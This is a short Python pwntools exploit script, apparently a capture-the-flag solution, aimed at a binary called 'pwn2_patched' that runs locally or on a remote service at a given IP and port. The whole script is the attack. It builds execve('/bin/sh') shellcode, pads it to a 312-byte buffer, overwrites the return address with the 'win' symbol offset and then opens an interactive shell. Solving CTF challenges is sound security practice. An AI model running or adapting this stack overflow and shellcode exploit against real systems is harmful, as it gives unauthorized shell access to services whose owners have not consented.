#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'pwn2_patched'
HOST = '103.77.175.40'
PORT = 6036

exe = ELF(exe_path, checksec=False)
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
break *main
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

# add payload, script here
shellcode = asm('''
    xor rax, rax
    mov rdi, 0x68732f6e69622f
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov al, 0x3b
    syscall
''')

my_shellcode = asm(shellcraft.sh()) # alternative shellcode /bin/sh

payload = my_shellcode.ljust(312, b'A')  # load shellcode and pad to buffer size

p.sendline(payload + p64(exe.symbols['win']+5))

p.interactive()
